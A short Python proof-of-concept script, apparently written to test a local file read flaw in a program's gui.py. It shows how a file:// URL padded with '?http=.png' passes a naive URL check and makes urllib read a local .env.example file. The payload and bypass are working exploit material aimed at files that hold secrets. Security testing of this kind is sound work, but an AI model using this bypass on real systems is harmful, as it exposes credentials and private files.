
import urllib.request
import io
from PIL import Image

def test_lfr(payload):
    print(f"Testing payload: {payload}")
    try:
        # Simulate the logic in gui.py
        if "http" in payload and (payload.endswith(".png") or payload.endswith(".jpg")):
            # Extract body (simulating the split in gui.py)
            body = payload
            print(f"Opening: {body}")
            resp = urllib.request.urlopen(body.strip())
            data = resp.read()
            print(f"Read {len(data)} bytes")
            # This would fail if not an image, but the file WAS read.
            try:
                img = Image.open(io.BytesIO(data))
                print("Successfully parsed as image")
            except Exception as e:
                print(f"Image parsing failed (expected for non-images): {e}")
        else:
            print("Payload didn't match conditions")
    except Exception as e:
        print(f"Error: {e}")

# Example LFR payload targeting .env.example
# It needs to contain "http" and end with ".png" or ".jpg"
# file:///path/to/file?http=.png should work
import os
target_file = os.path.abspath(".env.example").replace("\\", "/")
payload = f"file:///{target_file}?http=.png"
test_lfr(payload)
